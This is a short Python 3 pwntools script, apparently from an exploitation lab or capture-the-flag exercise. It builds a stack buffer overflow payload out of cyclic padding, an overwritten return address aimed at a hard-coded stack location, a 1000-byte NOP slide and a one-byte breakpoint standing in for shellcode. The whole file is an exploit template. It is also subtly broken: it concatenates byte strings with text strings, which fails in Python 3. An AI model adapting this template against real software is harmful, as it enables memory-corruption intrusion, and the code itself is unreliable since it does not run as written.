#!/usr/bin/env python3

from pwn import *

padding = cyclic(cyclic_find('taaa'))

eip = p32(0xffffd510 + 200)

nop_slide = "\x90" * 1000

shellcode = "\xcc"

payload = padding + eip + nop_slide + shellcode

print(payload)
